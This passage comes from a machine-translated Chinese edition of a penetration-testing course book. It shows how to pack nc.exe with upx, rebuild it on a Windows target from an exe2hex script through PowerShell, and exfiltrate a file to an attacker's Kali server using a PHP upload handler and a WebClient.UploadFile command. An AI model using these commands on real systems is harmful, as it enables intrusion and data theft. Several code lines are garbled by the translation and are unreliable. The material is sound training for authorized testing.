<div style="position:absolute;top:51777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 kali kali </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">58K</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sep 18 14:22 nc.exe</font></font></nobr></div>
<div style="position:absolute;top:51797;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 484 - 定位和检查 nc.exe</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管二进制文件已经很小，但我们将减小文件大小以展示它是如何完成的。</font><font style="vertical-align: inherit;">我们将</font></font></nobr></div>
<div style="position:absolute;top:51845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">upx</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，一个可执行的</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">打包</font></font></b><font style="vertical-align: inherit;">程序（也称为 PE 压缩工具）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">upx -9 nc.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:51897;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行文件的 Ultimate Packer</font></font></nobr></div>
<div style="position:absolute;top:51914;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 1996 - 2018</font></font></nobr></div>
<div style="position:absolute;top:51931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UPX 3.95    </font></font></nobr></div>
<div style="position:absolute;top:51931;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Markus Oberhumer、Laszlo Molnar 和 John Reiser 2018 年 8 月 26 日</font></font></nobr></div>
<div style="position:absolute;top:51965;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件大小    </font></font></nobr></div>
<div style="position:absolute;top:51965;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比率格式名称</font></font></nobr></div>
<div style="position:absolute;top:51982;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------- ------ ----------- -----------</font></font></nobr></div>
<div style="position:absolute;top:51999;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">59392 -&gt; 29696 50.00% win32/pe nc.exe</font></font></nobr></div>
<div style="position:absolute;top:52016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打包 1 个文件。</font></font></nobr></div>
<div style="position:absolute;top:52050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -lh nc.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:52067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwxr-xr-x 1 kali kali </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">29K</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sep 18 14:22 nc.exe</font></font></nobr></div>
<div style="position:absolute;top:52086;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 485 - 打包和压缩 nc.exe</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们所见，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">upx</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优化了</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">nc.exe</font></font></b><font style="vertical-align: inherit;">的文件大小，减少了近 50%。</font><font style="vertical-align: inherit;">尽管</font></font></nobr></div>
<div style="position:absolute;top:52135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">较小的尺寸，Windows PE 文件仍然可以正常运行并且可以正常运行。</font></font></nobr></div>
<div style="position:absolute;top:52168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们的文件已经优化并准备好传输，我们可以将 nc.exe 转换为 Windows 脚本</font></font></nobr></div>
<div style="position:absolute;top:52187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(.cmd) 在 Windows 机器上运行，它将文件转换为十六进制并指示</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:52207;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell.exe</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其组装回二进制文件。</font><font style="vertical-align: inherit;">我们将使用优秀的</font></font></font><i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe2hex</font></font></font></i><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工具</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转换过程：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe2hex -x nc.exe -p nc.cmd</font></font></font></b></nobr></div>
<div style="position:absolute;top:52278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] exe2hex v1.5.1</font></font></nobr></div>
<div style="position:absolute;top:52295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功写入 (PoSh) nc.cmd</font></font></nobr></div>
<div style="position:absolute;top:52314;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 486 - 将 nc.exe 转换为批处理文件 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:52447;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="45"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 45 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:52480;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:53557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:53557;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:53557;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">486</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将创建一个名为 nc.cmd 的脚本，其内容如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">head nc.cmd</font></font></font></b></nobr></div>
<div style="position:absolute;top:52628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo|set /p=""&gt;nc.hex</font></font></nobr></div>
<div style="position:absolute;top:52645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo|set /p="4d5a90000300000004000000ffff0000b8000000000000004000000000000000000000000</font></font></nobr></div>
<div style="position:absolute;top:52662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546</font></font></nobr></div>
<div style="position:absolute;top:52678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000</font></font></nobr></div>
<div style="position:absolute;top:52695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000000"&gt;&gt;nc.hex</font></font></nobr></div>
<div style="position:absolute;top:52712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo|set /p="504500004c010300b98eae340000000000000000e0000f010b01050000700000001000000</font></font></nobr></div>
<div style="position:absolute;top:52729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0d00000704c010000e00000005001000000400000100000000200000400000000000000040000000000000</font></font></nobr></div>
<div style="position:absolute;top:52747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00060010000100000000000000300000000001000001000000000100000100000000000001000000000000</font></font></nobr></div>
<div style="position:absolute;top:52763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000000"&gt;&gt;nc.hex</font></font></nobr></div>
<div style="position:absolute;top:52780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:52800;left:344"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 487 - exe2hex 的脚本输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意此脚本中的大多数命令是如何非交互式的，主要由 echo 组成</font></font></nobr></div>
<div style="position:absolute;top:52848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">在脚本的末尾，我们找到了重建 nc.exe 可执行文件的命令</font></font></nobr></div>
<div style="position:absolute;top:52868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标机器上：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:52902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:52920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=N</font></font></nobr></div>
<div style="position:absolute;top:52937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ew-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte] ::解析($h[0].S</font></font></nobr></div>
<div style="position:absolute;top:52954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ubstring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -enc</font></font></nobr></div>
<div style="position:absolute;top:52970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">oding 字节 'nc.exe' -value $b;Remove-Item -force nc.hex;"</font></font></nobr></div>
<div style="position:absolute;top:52990;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 488 - 用于重建 nc.exe 的 PowerShell 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们将此脚本复制并粘贴到 Windows 机器上的 shell 中并运行它时，我们可以看到</font></font></nobr></div>
<div style="position:absolute;top:53039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">事实上，它确实创建了我们原始 nc.exe 的完美工作副本。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:53090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">000000000000000000000000000000000000000000000"&gt;&gt;nc.hex</font></font></nobr></div>
<div style="position:absolute;top:53125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt;powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$</font></font></nobr></div>
<div style="position:absolute;top:53141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){ $b[$x]=[字节</font></font></nobr></div>
<div style="position:absolute;top:53158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};</font></font></nobr></div>
<div style="position:absolute;top:53175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置内容 - 编码字节 'nc.exe' -value $b;Remove-Item -force nc.hex;"</font></font></nobr></div>
<div style="position:absolute;top:53209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:53226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[v1.10 NT]</font></font></nobr></div>
<div style="position:absolute;top:53243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到某处：nc [-options] 主机名 port[s] [ports] ...</font></font></nobr></div>
<div style="position:absolute;top:53260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听入站：nc -l -p port [options] [hostname] [port]</font></font></nobr></div>
<div style="position:absolute;top:53277;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:53294;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-d    </font></font></nobr></div>
<div style="position:absolute;top:53294;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从控制台分离，隐身模式</font></font></nobr></div>
<div style="position:absolute;top:53328;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e 编    </font></font></nobr></div>
<div style="position:absolute;top:53328;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要执行的入站程序 [危险！！]</font></font></nobr></div>
<div style="position:absolute;top:53345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:53364;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 489 - 使用 PowerShell 重建 nc.exe</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:53395;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:53395;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Windows 脚本语言的 Windows 上传</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在某些情况下，我们可能需要使用 Windows 客户端从目标网络中窃取数据。</font></font></nobr></div>
<div style="position:absolute;top:53453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能很复杂，因为标准 TFTP、FTP 和 HTTP 服务器很少在 Windows 上启用</font></font></nobr></div>
<div style="position:absolute;top:53472;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:53635;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="46"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 46 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:53668;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:54745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:54745;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:54745;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">487</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">幸运的是，如果允许出站 HTTP 流量，我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net.WebClient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> PowerShell</font></font></nobr></div>
<div style="position:absolute;top:53783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类通过 HTTP POST 请求将数据上传到我们的 Kali 机器。</font></font></nobr></div>
<div style="position:absolute;top:53816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们可以创建以下 PHP 脚本并将其保存为我们的 Kali webroot 中的 upload.php</font></font></nobr></div>
<div style="position:absolute;top:53835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录，/var/www/html：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php</font></font></nobr></div>
<div style="position:absolute;top:53887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$uploaddir = '/var/www/uploads/';</font></font></nobr></div>
<div style="position:absolute;top:53921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$uploadfile = $uploaddir 。</font><font style="vertical-align: inherit;">$_FILES['file']['name'];</font></font></nobr></div>
<div style="position:absolute;top:53955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)</font></font></nobr></div>
<div style="position:absolute;top:53972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?&gt;</font></font></nobr></div>
<div style="position:absolute;top:53991;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 490 - 用于接收 HTTP POST 请求的 PHP 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 490 中的 PHP 代码将处理传入的文件上传请求并保存传输的文件</font></font></nobr></div>
<div style="position:absolute;top:54040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据到 /var/www/uploads/ 目录。</font></font></nobr></div>
<div style="position:absolute;top:54073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们必须创建uploads文件夹并修改其权限，授予</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font></nobr></div>
<div style="position:absolute;top:54092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有权和后续写入权限：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mkdir /var/www/uploads</font></font></font></b></nobr></div>
<div style="position:absolute;top:54161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ps -ef | </font><font style="vertical-align: inherit;">阿帕奇</font></font></font></b></nobr></div>
<div style="position:absolute;top:54178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根 1946 1 0 21:39 ?    </font></font></nobr></div>
<div style="position:absolute;top:54178;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 /usr/sbin/apache2 -k 开始</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:54195;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1947 1946 0 21:39 ？    </font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54195;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00 /usr/sbin/apache2 -k 开始</font></font></nobr></div>
<div style="position:absolute;top:54229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo chown www-data: /var/www/uploads</font></font></font></b></nobr></div>
<div style="position:absolute;top:54263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -la</font></font></font></b></nobr></div>
<div style="position:absolute;top:54280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共 16 个</font></font></nobr></div>
<div style="position:absolute;top:54297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 4 根 4096 二月 2 00:33。</font></font></nobr></div>
<div style="position:absolute;top:54314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 13 根根 4096 九月 20 14:57 ..</font></font></nobr></div>
<div style="position:absolute;top:54331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 2 根 4096 二月 2 00:33 html</font></font></nobr></div>
<div style="position:absolute;top:54348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 2 </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">www-data www-data</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 4096 Feb 2 00:33</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传</font></font></font></b></nobr></div>
<div style="position:absolute;top:54367;left:274"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 491 - 为上传目录设置文件权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，这将允许任何与 uploads.php 交互的人将文件上传到我们的 Kali 虚拟机</font></font></nobr></div>
<div style="position:absolute;top:54416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:54449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着 Apache 和 PHP 脚本准备好接收我们的文件，我们转移到受感染的 Windows</font></font></nobr></div>
<div style="position:absolute;top:54468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">托管并</font><font style="vertical-align: inherit;">从</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">System.Net.WebClient</font></font></b><font style="vertical-align: inherit;">类</font><font style="vertical-align: inherit;">调用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UploadFile</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font><font style="vertical-align: inherit;">以上传</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:54487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们要提取的文档，在本例中，是一个名为 important.docx 的文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\Offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell (New-Object System.Net.WebClient).UploadFile('http://10.11</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:54539;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.0.4/upload.php', 'important.docx')</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54558;left:245"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 492 - 将文件上传到攻击者机器的 PowerShell 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令后，我们可以验证文件传输成功：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/var/www/uploads$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -la</font></font></font></b></nobr></div>
<div style="position:absolute;top:54640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共 360</font></font></nobr></div>
<div style="position:absolute;top:54657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:38 。</font></font></nobr></div>
<div style="position:absolute;top:54674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 4 根 4096 二月 2 00:33 ..</font></font></nobr></div>
<div style="position:absolute;top:54691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rw-r--r-- 1 www-data www-data 359250 Feb 2 00:38 important.docx </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:54823;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="47"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 47 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:54856;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:55933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:55933;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:55933;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">488</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54952;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 493 - 文件下载到我们的 Kali 系统</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:54983;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16.2.5</font></font></i></nobr></div>
<div style="position:absolute;top:54983;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 TFTP 上传文件</font></font></i></nobr></div>
</span></font>
